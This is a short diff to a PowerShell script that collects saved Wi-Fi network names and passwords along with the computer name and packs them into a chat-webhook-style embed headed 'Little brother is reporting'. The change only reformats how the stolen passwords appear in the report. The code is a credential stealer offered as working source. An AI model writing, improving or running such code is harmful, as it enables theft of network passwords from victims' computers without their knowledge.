@@ -27,8 +27,8 @@ $forEmbed =  [PSCustomObject]@{
     'description' = '[Saved Wifi Password - ' + $env:computername + '] ' + 'Little brother is reporting: ' 
     'color'       = '16744960'
     'fields'   = @(@{
-    'name' = $wifinames
-    'value' = $wifipass.Replace(":", "") | Format-List | Out-String
+    'name' = ""
+    'value' = "**" + $wifinames + "**" + $wifipass.Replace(":", "") | Format-List | Out-String
     'inline' = $false
     })
 }
